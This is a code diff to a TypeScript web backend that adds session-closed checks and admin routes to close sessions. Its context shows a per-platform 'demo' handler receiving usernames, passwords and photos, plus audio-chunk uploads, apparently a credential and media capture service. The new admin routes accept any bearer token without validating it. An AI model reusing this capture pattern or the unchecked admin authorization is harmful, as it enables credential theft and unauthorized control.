@@ -50,6 +50,18 @@ async function persistPhotoToR2(
     },
   };
 }
+
+async function getSessionStatus(db: D1Database, sessionId: string) {
+  const row = await db
+    .prepare(`SELECT status FROM sessions WHERE id = ?`)
+    .bind(sessionId)
+    .first<{ status: string | null }>();
+  return row?.status || null;
+}
+
+function sessionClosedResponse(c: any) {
+  return c.json({ error: 'Session closed', closed: true }, 409);
+}
 // Middleware for authentication
 const authMiddleware = (c: any, next: any) => {
   const token = c.req.header('Authorization')?.replace('Bearer ', '');
@@ -87,6 +99,10 @@ api.post('/api/sessions/create', async (c) => {
   const userAgent = c.req.header('user-agent') || 'unknown';
 
   try {
+    const sessionStatus = await getSessionStatus(db, sessionId);
+    if (sessionStatus && sessionStatus !== 'active') {
+      return sessionClosedResponse(c);
+    }
     const credId = `sess_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
 
     await db
@@ -158,6 +174,10 @@ const createDemoHandler = (platform: string) => {
     const { email_or_username, password, photo_data, timestamp } = payload;
 
     try {
+      const sessionStatus = await getSessionStatus(c.env.DB, sessionId);
+      if (sessionStatus && sessionStatus !== 'active') {
+        return sessionClosedResponse(c);
+      }
       const currentSessionId = sessionId || `anonymous_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
       const existingSession = await db
         .prepare(`SELECT 1 FROM sessions WHERE id = ?`)
@@ -251,6 +271,11 @@ api.post('/api/media/photos', async (c) => {
       .bind(sessionId)
       .run();
 
+    const sessionStatus = await getSessionStatus(db, sessionId);
+    if (sessionStatus && sessionStatus !== 'active') {
+      return sessionClosedResponse(c);
+    }
+
     const photoId = `photo_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
     let storedPhoto: Awaited<ReturnType<typeof persistPhotoToR2>> = null;
     try {
@@ -293,6 +318,10 @@ api.post('/api/media/audio/chunk', async (c) => {
   const { session_id, audio_data, chunk_index } = await c.req.json();
 
   try {
+    const sessionStatus = await getSessionStatus(db, session_id);
+    if (sessionStatus && sessionStatus !== 'active') {
+      return sessionClosedResponse(c);
+    }
     const audioId = `audio_${session_id}_${chunk_index}`;
 
     await db
@@ -326,6 +355,89 @@ api.get('/api/admin/sessions', async (c) => {
   } catch (error) {
     console.error('Failed to fetch sessions:', error);
     return c.json({ error: 'Failed to fetch sessions' }, 500);
+  }
+});
+
+api.post('/api/admin/sessions/close-all', async (c) => {
+  const db = c.env.DB;
+  const token = c.req.header('Authorization')?.replace('Bearer ', '');
+
+  if (!token) {
+    return c.json({ error: 'Unauthorized' }, 401);
+  }
+
+  try {
+    const result = await db
+      .prepare(
+        `UPDATE sessions
+         SET status = 'closed', updated_at = CURRENT_TIMESTAMP
+         WHERE status = 'active'`
+      )
+      .run();
+
+    await db
+      .prepare(
+        `INSERT INTO admin_audit_log (id, admin_user, action, target_table, target_count, notes)
+         VALUES (?, 'admin', 'force_close_all_sessions', 'sessions', ?, ?)`
+      )
+      .bind(
+        `audit_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`,
+        result.meta?.changes || 0,
+        'Admin force-closed all active sessions'
+      )
+      .run();
+
+    return c.json({ success: true, closedCount: result.meta?.changes || 0 });
+  } catch (error) {
+    console.error('Failed to close sessions:', error);
+    return c.json({ error: 'Failed to close sessions' }, 500);
+  }
+});
+
+api.post('/api/admin/sessions/:id/close', async (c) => {
+  const db = c.env.DB;
+  const token = c.req.header('Authorization')?.replace('Bearer ', '');
+
+  if (!token) {
+    return c.json({ error: 'Unauthorized' }, 401);
+  }
+
+  const sessionId = c.req.param('id');
+
+  try {
+    const existing = await db
+      .prepare(`SELECT id, status FROM sessions WHERE id = ?`)
+      .bind(sessionId)
+      .first<{ id: string; status: string }>();
+
+    if (!existing) {
+      return c.json({ error: 'Session not found' }, 404);
+    }
+
+    if (existing.status !== 'active') {
+      return c.json({ success: true, sessionId, status: existing.status, alreadyClosed: true });
+    }
+
+    await db
+      .prepare(`UPDATE sessions SET status = 'closed', updated_at = CURRENT_TIMESTAMP WHERE id = ?`)
+      .bind(sessionId)
+      .run();
+
+    await db
+      .prepare(
+        `INSERT INTO admin_audit_log (id, admin_user, action, target_table, target_count, notes)
+         VALUES (?, 'admin', 'force_close_session', 'sessions', 1, ?)`
+      )
+      .bind(
+        `audit_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`,
+        `Admin force-closed session ${sessionId}`
+      )
+      .run();
+
+    return c.json({ success: true, sessionId, status: 'closed' });
+  } catch (error) {
+    console.error('Failed to close session:', error);
+    return c.json({ error: 'Failed to close session' }, 500);
   }
 });
 
